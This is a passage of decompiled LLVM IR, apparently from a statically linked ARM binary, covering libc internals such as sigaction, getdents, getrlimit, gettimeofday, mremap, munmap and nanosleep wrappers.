  store i32 %v3_14fac, i32* %stack_var_-16, align 4
  %v3_14fb8 = urem i32 %arg3, 4096
  %v2_14fbc = icmp eq i32 %v3_14fb8, 0
  br i1 %v2_14fbc, label %dec_label_pc_14fe0, label %dec_label_pc_14fc4

dec_label_pc_14fc4:                               ; preds = %entry
  %v0_14fc8 = call i32 @__aeabi_read_tp()
  store i32 %v0_14fc8, i32* %r0.global-to-local, align 4
  %v3_14fcc = load i16, i16* @global_var_22068.345, align 2
  %v4_14fcc = sext i16 %v3_14fcc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14fd8 = add i32 %v4_14fcc, %v0_14fc8
  %v4_14fd8 = inttoptr i32 %v3_14fd8 to i32*
  store i32 22, i32* %v4_14fd8, align 4
  %v0_15014.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15014

dec_label_pc_14fe0:                               ; preds = %entry
  %v0_14ff0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14ff0, -4095
  br i1 %tmp, label %dec_label_pc_15010, label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14fe0
  %v1_14ffc = sub i32 0, %v0_14ff0
  %v3_15000 = load i16, i16* @global_var_22068.345, align 2
  %v4_15000 = sext i16 %v3_15000 to i32
  %v0_15004 = call i32 @__aeabi_read_tp()
  %v3_15008 = add i32 %v4_15000, %v0_15004
  %v4_15008 = inttoptr i32 %v3_15008 to i32*
  store i32 %v1_14ffc, i32* %v4_15008, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15010

dec_label_pc_15010:                               ; preds = %dec_label_pc_14fe0, %dec_label_pc_14ff8
  %v0_15010 = phi i32 [ %v0_14ff0, %dec_label_pc_14fe0 ], [ -1, %dec_label_pc_14ff8 ]
  store i32 %v0_15010, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15014

dec_label_pc_15014:                               ; preds = %dec_label_pc_14fc4, %dec_label_pc_15010
  %v0_15014 = phi i32 [ %v0_15014.pre, %dec_label_pc_14fc4 ], [ %v0_15010, %dec_label_pc_15010 ]
  store i32 %v0_15014, i32* %r0.global-to-local, align 4
  %v2_15018 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15018, i32* @r4, align 4
  ret i32 %v0_15014

; uselistorder directives
  uselistorder i32 %v0_15014, { 1, 0 }
  uselistorder i32 %v0_14ff0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_15014, { 1, 0 }
  uselistorder label %dec_label_pc_15010, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_15028 = load i32, i32* @lr, align 4
  store i32 %v0_15028, i32* %stack_var_-4, align 4
  %v0_15030 = load i32, i32* @r0, align 4
  %v3_15034 = load i16, i16* @global_var_22068.345, align 2
  %v4_15034 = sext i16 %v3_15034 to i32
  store i32 %v4_15034, i32* @r2, align 4
  %v0_15038 = call i32 @__aeabi_read_tp()
  %v1_1503c = sub i32 0, %v0_15030
  store i32 %v1_1503c, i32* @r3, align 4
  %v2_15040 = load i32, i32* @r2, align 4
  %v3_15040 = add i32 %v2_15040, %v0_15038
  %v4_15040 = inttoptr i32 %v3_15040 to i32*
  store i32 %v1_1503c, i32* %v4_15040, align 4
  %v2_15048 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_15048, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15054 = load i32, i32* @r4, align 4
  %v6_15054 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1505c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1505c, label %dec_label_pc_150b0, label %dec_label_pc_15074

dec_label_pc_15074:                               ; preds = %entry
  %v1_15074 = add i32 %arg2, 4
  %v2_15074 = inttoptr i32 %v1_15074 to i32*
  %v3_15074 = load i32, i32* %v2_15074, align 4
  store i32 %v3_15074, i32* @r3, align 4
  %v1_15078 = and i32 %v3_15074, 67108864
  %v2_15078 = icmp eq i32 %v1_15078, 0
  br i1 %v2_15078, label %dec_label_pc_15080, label %dec_label_pc_150b0

dec_label_pc_15080:                               ; preds = %dec_label_pc_15074
  store i32 20, i32* @r2, align 4
  %v2_15084 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15084, i32* @r0, align 4
  %v0_15088 = call i32 @memcpy()
  store i32 %v2_15084, i32* @ip, align 4
  %v0_150b0.pre = load i32, i32* @r5, align 4
  %v0_150b8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150b0

dec_label_pc_150b0:                               ; preds = %dec_label_pc_15074, %entry, %dec_label_pc_15080
  %v0_150b8 = phi i32 [ %arg3, %dec_label_pc_15074 ], [ %arg3, %entry ], [ %v0_150b8.pre, %dec_label_pc_15080 ]
  %v0_150b4 = phi i32 [ %arg2, %dec_label_pc_15074 ], [ 0, %entry ], [ %v2_15084, %dec_label_pc_15080 ]
  %v0_150b0 = phi i32 [ %arg1, %dec_label_pc_15074 ], [ %arg1, %entry ], [ %v0_150b0.pre, %dec_label_pc_15080 ]
  %v4_150c0 = call i32 @__syscall_rt_sigaction(i32 %v0_150b0, i32 %v0_150b4, i32 %v0_150b8, i32 8)
  store i32 %v3_15054, i32* @r4, align 4
  store i32 %v6_15054, i32* @r5, align 4
  ret i32 %v4_150c0

; uselistorder directives
  uselistorder label %dec_label_pc_150b0, { 2, 0, 1 }
}

define i32 @function_150d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_150d4:
  %v0_150d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_150d4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_150d4
  %v2_150d4 = load i32, i32* @r8, align 4
  %v4_150d4 = mul i32 %v2_150d4, 2
  %v5_150d4 = and i32 %v4_150d4, %arg1
  %v2_150d8 = load i32, i32* @ip, align 4
  %v4_150d8 = lshr i32 %v2_150d8, %v5_150d4
  %v5_150d8 = sub i32 32, %v5_150d4
  %v6_150d8 = shl i32 %v2_150d8, %v5_150d8
  %v7_150d8 = or i32 %v6_150d8, %v4_150d8
  %v9_150d8 = and i32 %v7_150d8, %v5_150d4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_150d4, %bb
  %v10_150d8 = phi i32 [ %arg1, %dec_label_pc_150d4 ], [ %v9_150d8, %bb ]
  ret i32 %v10_150d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_150e0 = call i32 @__sigsetjmp()
  ret i32 %v0_150e0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15110 = load i32, i32* @r7, align 4
  store i32 %v3_15110, i32* %stack_var_-8, align 4
  %v0_1511c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1511c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1511c, -4095
  br i1 %tmp, label %dec_label_pc_15144, label %dec_label_pc_1512c

dec_label_pc_1512c:                               ; preds = %entry
  %v0_15130 = call i32 @__aeabi_read_tp()
  %v3_15134 = load i16, i16* @global_var_22068.345, align 2
  %v4_15134 = sext i16 %v3_15134 to i32
  %v0_15138 = load i32, i32* %r2.global-to-local, align 4
  %v1_15138 = sub i32 0, %v0_15138
  store i32 %v1_15138, i32* %r2.global-to-local, align 4
  %v3_1513c = add i32 %v4_15134, %v0_15130
  %v4_1513c = inttoptr i32 %v3_1513c to i32*
  store i32 %v1_15138, i32* %v4_1513c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15144.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15144

dec_label_pc_15144:                               ; preds = %entry, %dec_label_pc_1512c
  %v1_15148 = phi i32 [ %v0_1511c, %entry ], [ -1, %dec_label_pc_1512c ]
  %v2_15144 = phi i32 [ %v3_15110, %entry ], [ %v2_15144.pre, %dec_label_pc_1512c ]
  store i32 %v2_15144, i32* @r7, align 4
  ret i32 %v1_15148

; uselistorder directives
  uselistorder i32 %v0_1511c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15144, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1515c

dec_label_pc_1515c:                               ; preds = %dec_label_pc_15188, %dec_label_pc_1519c, %entry
  %v0_1515c = phi i32 [ %arg1, %entry ], [ %v0_1515c.pre.pre, %dec_label_pc_1519c ], [ %v0_15188, %dec_label_pc_15188 ]
  store i32 %v0_1515c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1515c, -4095
  br i1 %tmp, label %dec_label_pc_15188, label %dec_label_pc_15178

dec_label_pc_15178:                               ; preds = %dec_label_pc_1515c
  %v0_15178 = call i32 @__aeabi_read_tp()
  %v0_1517c = load i32, i32* %r2.global-to-local, align 4
  %v1_1517c = sub i32 0, %v0_1517c
  store i32 %v1_1517c, i32* %r2.global-to-local, align 4
  %v3_15180 = load i16, i16* @global_var_22068.345, align 2
  %v4_15180 = sext i16 %v3_15180 to i32
  %v3_15184 = add i32 %v4_15180, %v0_15178
  %v4_15184 = inttoptr i32 %v3_15184 to i32*
  store i32 %v1_1517c, i32* %v4_15184, align 4
  %v0_15188.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15188

dec_label_pc_15188:                               ; preds = %dec_label_pc_1515c, %dec_label_pc_15178
  %v0_15188 = phi i32 [ %v0_1515c, %dec_label_pc_1515c ], [ %v0_15188.pre, %dec_label_pc_15178 ]
  store i32 %v0_15188, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_15188, -4095
  br i1 %tmp4, label %dec_label_pc_1515c, label %dec_label_pc_1519c

dec_label_pc_1519c:                               ; preds = %dec_label_pc_15188
  %v0_1519c = call i32 @__aeabi_read_tp()
  %v0_151a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_151a0 = sub i32 0, %v0_151a0
  store i32 %v1_151a0, i32* %r2.global-to-local, align 4
  %v3_151a4 = load i16, i16* @global_var_22068.345, align 2
  %v4_151a4 = sext i16 %v3_151a4 to i32
  %v3_151a8 = add i32 %v4_151a4, %v0_1519c
  %v4_151a8 = inttoptr i32 %v3_151a8 to i32*
  store i32 %v1_151a0, i32* %v4_151a8, align 4
  %v0_1515c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1515c

; uselistorder directives
  uselistorder i32 %v0_15188, { 0, 2, 1 }
  uselistorder i32 %v0_1515c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15188, { 1, 0 }
  uselistorder label %dec_label_pc_1515c, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_151c0 = load i32, i32* @r1, align 4
  store i32 %v0_151c0, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_151d0 = load i32, i32* @r0, align 4
  store i32 %v0_151d0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_151d0, -4095
  br i1 %tmp, label %dec_label_pc_151f8, label %dec_label_pc_151dc

dec_label_pc_151dc:                               ; preds = %entry
  %v0_151e0 = call i32 @__aeabi_read_tp()
  %v3_151e4 = load i16, i16* @global_var_22068.345, align 2
  %v4_151e4 = sext i16 %v3_151e4 to i32
  store i32 %v4_151e4, i32* @r3, align 4
  %v0_151e8 = load i32, i32* @r2, align 4
  %v1_151e8 = sub i32 0, %v0_151e8
  store i32 %v1_151e8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_151f0 = add i32 %v4_151e4, %v0_151e0
  %v4_151f0 = inttoptr i32 %v3_151f0 to i32*
  store i32 %v1_151e8, i32* %v4_151f0, align 4
  br label %dec_label_pc_15208

dec_label_pc_151f8:                               ; preds = %entry
  store i32 %v0_151d0, i32* %r7.global-to-local, align 4
  %v2_151f8 = icmp eq i32 %v0_151d0, 0
  br i1 %v2_151f8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_151f8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_151f8, %bb
  call void @__pseudo_cond_branch(i1 %v2_151f8, i32 ptrtoint (i32* @global_var_15648.575 to i32))
  br label %dec_label_pc_15208

dec_label_pc_15208:                               ; preds = %dec_label_pc_151dc, %.thread
  %v0_15208 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_15208

; uselistorder directives
  uselistorder i32 %v0_151d0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15208, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_1521c = load i32, i32* @r5, align 4
  %v18_1521c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15254, label %dec_label_pc_15238

dec_label_pc_15238:                               ; preds = %entry
  %v1_1523c = sub i32 0, %arg1
  %v3_15240 = load i16, i16* @global_var_22068.345, align 2
  %v4_15240 = sext i16 %v3_15240 to i32
  store i32 %v4_15240, i32* %r3.global-to-local, align 4
  %v0_15244 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_1524c = add i32 %v4_15240, %v0_15244
  %v4_1524c = inttoptr i32 %v3_1524c to i32*
  store i32 %v1_1523c, i32* %v4_1524c, align 4
  br label %dec_label_pc_152a8

dec_label_pc_15254:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15254
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_1525c = add i32 %arg2, %arg1
  store i32 %v3_1525c, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15254, %bb
  %v1_152984 = phi i32 [ %v18_1521c, %dec_label_pc_15254 ], [ %v3_1525c, %bb ]
  %v0_152942 = phi i32 [ 141, %dec_label_pc_15254 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_152a8, label %dec_label_pc_15294

dec_label_pc_15268:                               ; preds = %dec_label_pc_15294
  %v1_1529c = inttoptr i32 %v1_15294 to i8*
  %v1_15268 = add i32 %v0_15268, 8
  %v2_15268 = inttoptr i32 %v1_15268 to i16*
  %v3_15268 = load i16, i16* %v2_15268, align 2
  %v4_15268 = zext i16 %v3_15268 to i32
  %v2_1526c = add i32 %v4_15268, %v0_15268
  store i32 %v2_1526c, i32* @r3, align 4
  %v1_15270 = add i32 %v2_1526c, -1
  %v2_15270 = inttoptr i32 %v1_15270 to i8*
  %v3_15270 = load i8, i8* %v2_15270, align 1
  %v4_15270 = zext i8 %v3_15270 to i32
  store i32 %v4_15270, i32* @r4, align 4
  %v3_15274 = call i32 @strlen(i8* %v1_1529c)
  %v0_15278 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15278, i32* @r1, align 4
  %v1_1527c = add i32 %v3_15274, 1
  store i32 %v1_1527c, i32* @r2, align 4
  %v0_15280 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15280, i32* @r0, align 4
  %v3_15284 = call i32 @memmove(i32 %v0_15280, i32 %v0_15278, i32 %v1_1527c)
  %v0_15288 = load i32, i32* %r7.global-to-local, align 4
  %v1_15288 = add i32 %v0_15288, 8
  %v2_15288 = inttoptr i32 %v1_15288 to i16*
  %v3_15288 = load i16, i16* %v2_15288, align 2
  %v4_15288 = zext i16 %v3_15288 to i32
  store i32 %v4_15288, i32* %r3.global-to-local, align 4
  %v0_1528c = load i32, i32* @r4, align 4
  %v1_1528c = trunc i32 %v0_1528c to i8
  %v3_1528c = add i32 %v0_15288, 10
  %v4_1528c = inttoptr i32 %v3_1528c to i8*
  store i8 %v1_1528c, i8* %v4_1528c, align 1
  %v0_15290 = load i32, i32* %r7.global-to-local, align 4
  %v1_15290 = load i32, i32* %r3.global-to-local, align 4
  %v2_15290 = add i32 %v1_15290, %v0_15290
  store i32 %v2_15290, i32* %r7.global-to-local, align 4
  %v1_15298.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_15294

dec_label_pc_15294:                               ; preds = %.thread, %dec_label_pc_15268
  %v1_15298 = phi i32 [ %v1_15298.pre, %dec_label_pc_15268 ], [ %v1_152984, %.thread ]
  %v0_15268 = phi i32 [ %v2_15290, %dec_label_pc_15268 ], [ %v0_152942, %.thread ]
  %v1_15294 = add i32 %v0_15268, 10
  store i32 %v1_15294, i32* %r6.global-to-local, align 4
  %v3_15298 = icmp ult i32 %v0_15268, %v1_15298
  %v1_152a0 = add i32 %v0_15268, 11
  store i32 %v1_152a0, i32* %r8.global-to-local, align 4
  br i1 %v3_15298, label %dec_label_pc_15268, label %dec_label_pc_152a8

dec_label_pc_152a8:                               ; preds = %dec_label_pc_15294, %.thread, %dec_label_pc_15238
  %v0_152a8 = load i32, i32* @r5, align 4
  store i32 %v6_1521c, i32* @r5, align 4
  store i32 %v18_1521c, i32* @sl, align 4
  ret i32 %v0_152a8

; uselistorder directives
  uselistorder i32 %v1_15294, { 1, 0 }
  uselistorder i32 %v0_15268, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_1521c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15294, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_152c0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_152cc = call i32 @getrlimit(i32 7, i32 %v2_152c0)
  %v1_152d0 = icmp slt i32 %v2_152cc, 0
  %v5_152d4 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_152d0, i32 256, i32 %v5_152d4
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_152f8 = load i32, i32* @r0, align 4
  ret i32 %v1_152f8
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1530c = load i32, i32* @r0, align 4
  ret i32 %v1_1530c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15320 = load i32, i32* @r0, align 4
  ret i32 %v1_15320
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_15330 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 148) to i32*), align 4
  %v1_15334 = inttoptr i32 %v4_15330 to i32*
  %v2_15334 = load i32, i32* %v1_15334, align 4
  %v2_15338 = icmp eq i32 %v2_15334, 0
  br i1 %v2_15338, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_15340 = phi i32 [ %v2_15334, %entry ], [ 4096, %bb ]
  ret i32 %v1_15340

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15378, label %dec_label_pc_15360

dec_label_pc_15360:                               ; preds = %entry
  %v1_15364 = sub i32 0, %arg1
  %v3_15368 = load i16, i16* @global_var_22068.345, align 2
  %v4_15368 = sext i16 %v3_15368 to i32
  %v0_1536c = call i32 @__aeabi_read_tp()
  %v3_15370 = add i32 %v4_15368, %v0_1536c
  %v4_15370 = inttoptr i32 %v3_15370 to i32*
  store i32 %v1_15364, i32* %v4_15370, align 4
  br label %dec_label_pc_15378

dec_label_pc_15378:                               ; preds = %entry, %dec_label_pc_15360
  %v1_1537c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15360 ]
  ret i32 %v1_1537c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15378, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15384 = load i32, i32* @r7, align 4
  store i32 %v3_15384, i32* %stack_var_-8, align 4
  %v0_15390 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15390, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15390, -4095
  br i1 %tmp, label %dec_label_pc_153b8, label %dec_label_pc_153a0

dec_label_pc_153a0:                               ; preds = %entry
  %v0_153a4 = call i32 @__aeabi_read_tp()
  %v3_153a8 = load i16, i16* @global_var_22068.345, align 2
  %v4_153a8 = sext i16 %v3_153a8 to i32
  store i32 %v4_153a8, i32* @r3, align 4
  %v0_153ac = load i32, i32* %r2.global-to-local, align 4
  %v1_153ac = sub i32 0, %v0_153ac
  store i32 %v1_153ac, i32* %r2.global-to-local, align 4
  %v3_153b0 = add i32 %v4_153a8, %v0_153a4
  %v4_153b0 = inttoptr i32 %v3_153b0 to i32*
  store i32 %v1_153ac, i32* %v4_153b0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_153b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_153b8

dec_label_pc_153b8:                               ; preds = %entry, %dec_label_pc_153a0
  %v1_153bc = phi i32 [ %v0_15390, %entry ], [ -1, %dec_label_pc_153a0 ]
  %v2_153b8 = phi i32 [ %v3_15384, %entry ], [ %v2_153b8.pre, %dec_label_pc_153a0 ]
  store i32 %v2_153b8, i32* @r7, align 4
  ret i32 %v1_153bc

; uselistorder directives
  uselistorder i32 %v0_15390, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_153b8, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_153d4 = load i32, i32* @r0, align 4
  ret i32 %v1_153d4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_153d8 = load i32, i32* @r4, align 4
  store i32 %v3_153d8, i32* %stack_var_-12, align 4
  %v0_153e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_153e8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_153e8, -4095
  br i1 %tmp, label %dec_label_pc_15410, label %dec_label_pc_153f8

dec_label_pc_153f8:                               ; preds = %entry
  %v0_153fc = call i32 @__aeabi_read_tp()
  %v3_15400 = load i16, i16* @global_var_22068.345, align 2
  %v4_15400 = sext i16 %v3_15400 to i32
  %v0_15404 = load i32, i32* %r2.global-to-local, align 4
  %v1_15404 = sub i32 0, %v0_15404
  store i32 %v1_15404, i32* %r2.global-to-local, align 4
  %v3_15408 = add i32 %v4_15400, %v0_153fc
  %v4_15408 = inttoptr i32 %v3_15408 to i32*
  store i32 %v1_15404, i32* %v4_15408, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15410.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15410

dec_label_pc_15410:                               ; preds = %entry, %dec_label_pc_153f8
  %v1_15414 = phi i32 [ %v0_153e8, %entry ], [ -1, %dec_label_pc_153f8 ]
  %v2_15410 = phi i32 [ %v3_153d8, %entry ], [ %v2_15410.pre, %dec_label_pc_153f8 ]
  store i32 %v2_15410, i32* @r4, align 4
  ret i32 %v1_15414

; uselistorder directives
  uselistorder i32 %v0_153e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15410, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1541c = load i32, i32* @r7, align 4
  store i32 %v3_1541c, i32* %stack_var_-8, align 4
  %v0_15428 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15428, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15428, -4095
  br i1 %tmp, label %dec_label_pc_15450, label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %entry
  %v0_1543c = call i32 @__aeabi_read_tp()
  %v3_15440 = load i16, i16* @global_var_22068.345, align 2
  %v4_15440 = sext i16 %v3_15440 to i32
  %v0_15444 = load i32, i32* %r2.global-to-local, align 4
  %v1_15444 = sub i32 0, %v0_15444
  store i32 %v1_15444, i32* %r2.global-to-local, align 4
  %v3_15448 = add i32 %v4_15440, %v0_1543c
  %v4_15448 = inttoptr i32 %v3_15448 to i32*
  store i32 %v1_15444, i32* %v4_15448, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15450.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15450

dec_label_pc_15450:                               ; preds = %entry, %dec_label_pc_15438
  %v1_15454 = phi i32 [ %v0_15428, %entry ], [ -1, %dec_label_pc_15438 ]
  %v2_15450 = phi i32 [ %v3_1541c, %entry ], [ %v2_15450.pre, %dec_label_pc_15438 ]
  store i32 %v2_15450, i32* @r7, align 4
  ret i32 %v1_15454

; uselistorder directives
  uselistorder i32 %v0_15428, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15450, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1545c = load i32, i32* @r7, align 4
  store i32 %v3_1545c, i32* %stack_var_-8, align 4
  %v0_15468 = load i32, i32* @r0, align 4
  store i32 %v0_15468, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15468, -4095
  br i1 %tmp, label %dec_label_pc_15490, label %dec_label_pc_15478

dec_label_pc_15478:                               ; preds = %entry
  %v0_1547c = call i32 @__aeabi_read_tp()
  %v3_15480 = load i16, i16* @global_var_22068.345, align 2
  %v4_15480 = sext i16 %v3_15480 to i32
  %v0_15484 = load i32, i32* %r2.global-to-local, align 4
  %v1_15484 = sub i32 0, %v0_15484
  store i32 %v1_15484, i32* %r2.global-to-local, align 4
  %v3_15488 = add i32 %v4_15480, %v0_1547c
  %v4_15488 = inttoptr i32 %v3_15488 to i32*
  store i32 %v1_15484, i32* %v4_15488, align 4
  %v2_15490.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15490

dec_label_pc_15490:                               ; preds = %entry, %dec_label_pc_15478
  %v1_15494 = phi i32 [ %v0_15468, %entry ], [ -1, %dec_label_pc_15478 ]
  %v2_15490 = phi i32 [ %v3_1545c, %entry ], [ %v2_15490.pre, %dec_label_pc_15478 ]
  store i32 %v2_15490, i32* @r7, align 4
  ret i32 %v1_15494

; uselistorder directives
  uselistorder i32 %v0_15468, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15490, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_154a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12776) to i32*), align 4
  %v2_154ac = icmp eq i32 %v4_154a8, 0
  %v3_154b0 = load i32, i32* @r4, align 4
  %v9_154b0 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
